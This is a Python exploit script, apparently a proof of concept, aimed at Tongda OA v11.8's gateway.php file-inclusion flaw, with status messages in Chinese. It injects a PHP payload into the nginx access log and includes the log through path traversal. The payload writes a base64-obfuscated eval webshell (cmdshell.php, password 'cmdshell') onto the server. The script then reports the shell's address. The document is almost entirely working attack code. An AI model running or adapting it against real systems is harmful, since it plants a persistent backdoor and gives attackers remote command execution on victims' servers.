import time
import requests
import urllib3
from rich.console import Console

console = Console()
proxies={'http':'http://127.0.0.1:8080'}
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        }
    headerx = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    payload='''d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>'''
    data='json={"url":"/general/../../nginx/logs/oa.access.log"}'
    
    incloud_url=target_url+payload
    exp_url=target_url+'ispirit/interface/gateway.php'
    vlun_url=target_url+'mac/gateway.php'
    shell_url=target_url+'mac/cmdshell.php'
    
    console.print(now_time() + " [INFO]     正在检测通达OA v11.8 getway.php 远程文件包含漏洞", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        log = requests.get(incloud_url, headers=headers, verify=False)
        response1=requests.post(exp_url, headers=headerx, data=data,verify=False)
        response2=requests.post(vlun_url, headers=headerx, data=data,verify=False)
        shell = requests.get(shell_url, headers=headers, verify=False)
        if   response2.status_code == 200:
            console.print(now_time() + ' [SUCCESS]  包含漏洞存在，包含数据包为:{}'.format(vlun_url), style='bold green')
            console.print(now_time() + ''' [SUCCESS]  POST /mac/gateway.php HTTP/1.1
                       Host: 
                       User-Agent: Go-http-client/1.1
                       Content-Length: 54
                       Content-Type: application/x-www-form-urlencoded
                       Accept-Encoding: gzip

                       json={"url":"/general/../../nginx/logs/oa.access.log"}''', style='bold green')
            if  shell.status_code==200:
                console.print(now_time() + ' [SUCCESS]  上传webshell成功，密码为cmdshell，shell地址:{}'.format(shell_url), style='bold green')
                
            else:
                console.print(now_time() + ' [WARNING]  通达OA 包含日志成功，可查取日志文件，但无法在目录下生成webshell', style='bold red ')
        else:
                console.print(now_time() + ' [WARNING]  通达OA v11.8远程包含不存在', style='bold red ')    

    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')


            